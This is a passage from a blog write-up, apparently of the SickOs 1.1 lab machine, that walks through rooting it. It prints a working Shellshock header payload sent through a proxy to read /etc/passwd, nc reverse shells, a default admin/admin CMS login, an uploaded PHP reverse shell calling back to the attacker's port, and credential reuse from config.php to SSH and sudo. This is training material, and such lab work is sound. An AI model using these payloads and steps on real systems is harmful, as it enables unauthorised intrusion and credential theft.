<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/SickOs# wget -q -O- -U -e <span class="nv">use_proxy</span><span class="o">=</span>on -e <span class="nv">http_proxy</span><span class="o">=</span>10.1.1.149:3128 <span class="p">&amp;</span>ldquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.149&quot;</span>&gt;http://10.1.1.149&lt;/a&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;
</span><span class='line'>BLEHHH!!!
</span><span class='line'>&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@kali:~/SickOs# wget -q -O- -U <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="o">()</span> <span class="o">{</span> <span class="nb">test</span><span class="p">;</span><span class="o">}</span><span class="p">;</span><span class="nb">echo</span> <span class="se">\&quot;</span>content-type: text/plain<span class="se">\&amp;</span>rdquo<span class="p">;;</span> <span class="nb">echo</span><span class="p">;</span> <span class="nb">echo</span><span class="p">;</span> /bin/cat /etc/passwd<span class="s2">&quot; -e use_proxy=on -e http_proxy=10.1.1.149:3128 &amp;ldquo;&lt;a href=&quot;</span>http://10.1.1.149/cgi-bin/status<span class="s2">&quot;&gt;http://10.1.1.149/cgi-bin/status&lt;/a&gt;&amp;rdquo;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="s2">&lt;p&gt;root:x:0:0:root:/root:/bin/bash</span>
</span><span class='line'><span class="s2">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span>
</span><span class='line'><span class="s2">bin:x:2:2:bin:/bin:/bin/sh</span>
</span><span class='line'><span class="s2">sys:x:3:3:sys:/dev:/bin/sh</span>
</span><span class='line'><span class="s2">sync:x:4:65534:sync:/bin:/bin/sync</span>
</span><span class='line'><span class="s2">games:x:5:60:games:/usr/games:/bin/sh</span>
</span><span class='line'><span class="s2">man:x:6:12:man:/var/cache/man:/bin/sh</span>
</span><span class='line'><span class="s2">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span>
</span><span class='line'><span class="s2">mail:x:8:8:mail:/var/mail:/bin/sh</span>
</span><span class='line'><span class="s2">&lt;a href=&quot;</span>news:x:9:9:news:/var/spool/news:/bin/sh<span class="err">&quot;</span>&gt;news:x:9:9:news:/var/spool/news:/bin/sh&lt;/a&gt;
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>syslog:x:101:103::/home/syslog:/bin/false
</span><span class='line'>messagebus:x:102:105::/var/run/dbus:/bin/false
</span><span class='line'>whoopsie:x:103:106::/nonexistent:/bin/false
</span><span class='line'>landscape:x:104:109::/var/lib/landscape:/bin/false
</span><span class='line'>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
</span><span class='line'>mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
</span></code></pre></td></tr></table></div></figure></p>

<p>It works!, the file <code>/etc/passwd</code> can be read and I also noticed that there is an user called <code>sickos</code> which would be used to privilege escaping later. <code>shellshock</code> vulnerability has been confirmed and can be exploited.</p>

<p>So then, I setup <code>nc</code> to listen on local port <code>4444</code> and exploit <code>shellshock</code> to get a connection back.</p>

<p><img class="left" src="/downloads/SickOs1.&frac14;.png"></p>

<p>Bingo! Now we have got a limited remote shell connect back to my tcp port <code>4444</code> which is listened by <code>nc</code>.</p>

<h3>0x01 Analyze and exploit Wolf CMS 0.8.2</h3>

<p>By searching online about <code>wolfcms</code>, learn it to know that it has login page: <code>http://10.1.1.149/wolfcms/?/admin/login</code></p>

<p>After tried several weak passwords, I managed to login successful with the weak login credential: <code>admin / admin</code></p>

<p><img class="left" src="/downloads/SickOs1.1/5.png"></p>

<p>Under the <code>file_manager</code>, I can upload php shell to target server. In this case I uploaded a <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">reverse php shell</a> (rsh.php) which will connected back to my Kali&rsquo;s port <code>5555</code>.</p>

<p><img class="left" src="/downloads/SickOs1.1/6.png"></p>

<p>Then I have to change the file attributes to <code>0777</code>.</p>

<p><img class="left" src="/downloads/SickOs1.1/7.png"></p>

<p>From what I learnt online, the uploaded php shell can be found in <code>/public/</code> folder, so I set up <code>nc</code> again to listen on port <code>5555</code> and visit this URL <code>http://10.1.1.149/wolfcms/public/rsh.php</code> to trigger the reverse shell.</p>

<p><img class="left" src="/downloads/SickOs1.1/8.png"></p>

<p>Now I get in~</p>

<p>It&rsquo;s time to ROOT!</p>

<p>After enumeration on the file system, I found a configuration file which including sensitive information / login credentials, the file location is <code>/var/www/wolfcms/config.php</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>www-data@SickOs:/usr/lib/cgi-bin<span class="nv">$ </span>head -n <span class="m">15</span> /var/www/wolfcms/config.php
</span><span class='line'>head -n <span class="m">15</span> /var/www/wolfcms/config.php
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span><span class="se">\?</span>php&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;// Database information:
</span><span class='line'>// <span class="k">for</span> SQLite, use sqlite:/tmp/wolf.db <span class="o">(</span>SQLite 3<span class="o">)</span>
</span><span class='line'>// The path can only be absolute path or :memory:
</span><span class='line'>// For more info look at: www.php.net/pdo&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;// Database settings:
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_DSN<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>mysql:dbname<span class="o">=</span>wolf<span class="p">;</span><span class="nv">host</span><span class="o">=</span>localhost<span class="p">;</span><span class="nv">port</span><span class="o">=</span>3306<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_USER<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>root<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_PASS<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>john@123<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>TABLE_PREFIX<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;// Should Wolf produce PHP error messages <span class="k">for</span> debugging?
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DEBUG<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="nb">false</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>www-data@SickOs:/usr/lib/cgi-bin<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>By checking the configuration file, I found DB user is <code>root</code> and password is <font color='red'><code>john@123</code></font>. I try to login SSH as user <code>root</code> with the compromised key <font color='red'><code>john@123</code></font> but failed. Then I try to SSH login as user <code>sickos</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ssh &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#111;&amp;#58;&amp;#115;&amp;#x69;&amp;#99;&amp;#107;&amp;#x6f;&amp;#115;&amp;#x40;&amp;#x31;&amp;#48;&amp;#x2e;&amp;#x31;&amp;#46;&amp;#x31;&amp;#46;&amp;#x31;&amp;#x34;&amp;#x39;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#115;&amp;#x69;&amp;#99;&amp;#x6b;&amp;#x6f;&amp;#115;&amp;#64;&amp;#49;&amp;#48;&amp;#46;&amp;#49;&amp;#46;&amp;#49;&amp;#46;&amp;#49;&amp;#x34;&amp;#x39;&lt;/a&gt;</span>
</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#x69;&amp;#108;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#x73;&amp;#x69;&amp;#99;&amp;#x6b;&amp;#111;&amp;#x73;&amp;#x40;&amp;#49;&amp;#48;&amp;#x2e;&amp;#x31;&amp;#x2e;&amp;#x31;&amp;#46;&amp;#49;&amp;#x34;&amp;#57;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#115;&amp;#x69;&amp;#99;&amp;#107;&amp;#x6f;&amp;#115;&amp;#x40;&amp;#49;&amp;#x30;&amp;#46;&amp;#49;&amp;#x2e;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#x34;&amp;#x39;&lt;/a&gt;&amp;rsquo;s password:</span>
</span><span class='line'>Welcome to Ubuntu 12.04.4 LTS <span class="o">(</span>GNU/Linux 3.11.0-15-generic i686<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Documentation:  &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://help.ubuntu.com/&quot;</span>&gt;https://help.ubuntu.com/&lt;/a&gt;&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  System information as of Wed Dec <span class="m">16</span> 18:37:11 IST 2015&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  System load:  0.0               Processes:           115
</span><span class='line'>  Usage of /:   4.3% of 28.42GB   Users logged in:     0
</span><span class='line'>  Memory usage: 12%               IP address <span class="k">for</span> eth0: 10.1.1.149
</span><span class='line'>  Swap usage:   0%&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  Graph this data and manage this system at:
</span><span class='line'>    &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://landscape.canonical.com/&quot;</span>&gt;https://landscape.canonical.com/&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;124 packages can be updated.
</span><span class='line'><span class="m">92</span> updates are security updates.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;New release <span class="p">&amp;</span>lsquo<span class="p">;</span>14.04.3 LTS<span class="p">&amp;</span>rsquo<span class="p">;</span> available.
</span><span class='line'>Run <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="k">do</span>-release-upgrade<span class="p">&amp;</span>rsquo<span class="p">;</span> to upgrade to it.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Last login: Tue Dec <span class="m">15</span> 18:12:43 <span class="m">2015</span> from 10.1.1.130
</span><span class='line'>sickos@SickOs:~<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>sickos<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>sickos<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>sickos<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,111<span class="o">(</span>lpadmin<span class="o">)</span>,112<span class="o">(</span>sambashare<span class="o">)</span>
</span><span class='line'>sickos@SickOs:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Got in! Then I did enumeration over the target machine and found user <code>sickos</code> is able to use <code>sudo</code> command to run any commands as root privilege.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sickos@SickOs:~<span class="nv">$ </span>sudo -l
</span><span class='line'><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> sickos:
</span><span class='line'>Matching Defaults entries <span class="k">for</span> sickos on this host:
</span><span class='line'>    env_reset, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;User sickos may run the following commands on this host:
</span><span class='line'>    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;sickos@SickOs:~<span class="nv">$ </span>sudo su
</span><span class='line'>root@SickOs:/home/sickos# id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span><span class='line'>root@SickOs:/home/sickos# ls -al /root
</span><span class='line'>total 40
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>  <span class="m">3</span> root root <span class="m">4096</span> Dec  <span class="m">6</span> 21:14 .
</span><span class='line'>drwxr-xr-x <span class="m">22</span> root root <span class="m">4096</span> Sep <span class="m">22</span> 08:13 ..
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root   <span class="m">96</span> Dec  <span class="m">6</span> 07:27 a0216ea4d51874464078c618298b1367.txt
</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-  <span class="m">1</span> root root <span class="m">3977</span> Dec <span class="m">15</span> 19:18 .bash_history
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root <span class="m">3106</span> Apr <span class="m">19</span>  <span class="m">2012</span> .bashrc
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>  <span class="m">2</span> root root <span class="m">4096</span> Sep <span class="m">22</span> 08:33 .cache
</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-  <span class="m">1</span> root root   <span class="m">22</span> Dec  <span class="m">5</span> 06:24 .mysql_history
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root  <span class="m">140</span> Apr <span class="m">19</span>  <span class="m">2012</span> .profile
</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-  <span class="m">1</span> root root <span class="m">5230</span> Dec  <span class="m">6</span> 21:14 .viminfo&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@SickOs:/home/sickos# cat /root/a0216ea4d51874464078c618298b1367.txt
</span><span class='line'>If you are viewing this!!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;ROOT!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;You have Succesfully completed SickOS1.1.
</span><span class='line'>Thanks <span class="k">for</span> Trying&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@SickOs:/home/sickos#
</span></code></pre></td></tr></table></div></figure></p>

<p>Done with smile :) !!</p>

<!--- Reference -->



]]></content>
  </entry>
  
</feed>
